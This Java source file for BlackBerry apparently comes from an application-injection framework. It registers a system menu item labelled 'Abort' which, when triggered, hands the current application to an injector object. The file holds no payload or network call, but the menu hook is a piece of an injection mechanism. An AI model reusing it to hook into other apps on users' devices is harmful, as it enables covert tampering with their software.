package blackberry.injection;

import net.rim.device.api.ui.UiApplication;
import blackberry.application.InjectorManager;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.AInjector;

public class InjectorSystemMenu extends SystemMenuInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("InjectorSystemMenu",
            DebugLevel.VERBOSE);
    //#endif
    private InjectorManager manager;
    private AInjector injector;

    protected String getMenuName() {
        return "Abort";
    }

    public InjectorSystemMenu(InjectorManager manager, AInjector injector) {
        super(0);
        this.manager = manager;
        this.injector = injector;
    }

    public Object run(Object context) {
        //#ifdef DEBUG
        debug.trace("run");
        //#endif
        UiApplication app = UiApplication.getUiApplication();
        //#ifdef DEBUG
        debug.trace("run on: " + app);
        //#endif

        injector.setInjectedApp(app);

        return null;
    }

}
